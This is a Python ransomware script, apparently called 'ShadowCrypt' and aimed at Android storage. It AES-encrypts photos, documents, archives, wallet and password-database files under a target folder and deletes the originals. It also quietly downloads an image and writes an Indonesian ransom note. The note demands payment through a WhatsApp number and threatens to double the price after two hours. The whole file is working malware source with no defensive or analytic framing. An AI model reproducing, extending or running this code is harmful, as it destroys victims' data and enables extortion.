import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import requests
import mimetypes

# Konfigurasi
TARGET_FOLDER = "/sdcard/virus/"
KEY_FILE = "key.key"
HIDDEN_FOLDER = "/sdcard/virus/"
IMAGE_FILENAME = "Ransomware.jpg"
IMAGE_URL = "https://i.imgur.com/9u2u6EL.jpeg"

# Buat kunci AES
key = get_random_bytes(16)
with open(KEY_FILE, "wb") as f:
    f.write(key)

def silent_download(url, save_path):
    try:
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'}
        with requests.get(url, headers=headers, stream=True, timeout=30) as response:
            response.raise_for_status()
            content_type = response.headers.get('content-type', '')
            extension = mimetypes.guess_extension(content_type.split(';')[0])
            if extension and not save_path.endswith(extension):
                save_path += extension
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
        return os.path.exists(save_path)
    except:
        return False

def encrypt_file(filepath, key):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        iv = cipher.iv
        encrypted_data = iv + ct_bytes
        with open(filepath + ".enc", "wb") as f:
            f.write(encrypted_data)
        os.remove(filepath)
        return True
    except:
        return False

def main():
    os.makedirs(HIDDEN_FOLDER, exist_ok=True)
    image_path = os.path.join(HIDDEN_FOLDER, IMAGE_FILENAME)
    silent_download(IMAGE_URL, image_path)

    target_extensions = (
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.svg',
        '.mp4', '.mkv', '.avi', '.mov', '.wmv', '.mpg', '.webm',
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.backup', '.bak', '.tgz',
        '.apk', '.exe', '.dll', '.so', '.py', '.sh', '.js', '.php', '.html', '.css', '.cpp', '.java', '.kt', '.swift',
        '.mp3', '.csv', '.ppt', '.pptx', '.odt', '.ods', '.odp', '.rtf', '.tex', '.djvu', '.epub', '.mobi',
        '.raw', '.heic', '.3gp', '.flv', '.m4v', '.apks', '.xapk',
        '.wallet', '.dat', '.kdbx', '.log', '.txt', '.cfg', '.ini', '.vcf'
    )

    for root, _, files in os.walk(TARGET_FOLDER):
        for file in files:
            filepath = os.path.join(root, file)
            if file.lower().endswith(target_extensions) and filepath != image_path:
                try:
                    encrypt_file(filepath, key)
                except:
                    continue

    ransom_note = """
====================================
Ransomware ShadowCrypt 2025.4.22
  FILE KAMU TELAH DIENKRIPSI!
====================================

Semua file penting kamu (gambar, video, dokumen, dll) telah dienkripsi oleh sistem kami.

Untuk mendapatkan kunci dekripsi, kamu harus membayar 200k dan mengirim bukti tebusan ke nomor WhatsApp berikut:

    - WhatsApp: wa.me/6282298948900

Setelah pembayaran dan validasi API Key, kamu akan menerima file kunci (key) untuk mendekripsi file kamu.

Anda memiliki 2 jam sebelum harga naik 2x.

JANGAN:
- Mencoba perbaiki sendiri
- Mengubah nama file
- Menghapus file .enc
- Menghapus WARNING.txt

Jika hilang, data kamu tidak bisa dikembalikan.

Terima kasih.

Time ShadowCrypt
========================================
"""
    with open(os.path.join(TARGET_FOLDER, "WARNING.txt"), "w") as f:
        f.write(ransom_note)

if __name__ == "__main__":
    main()
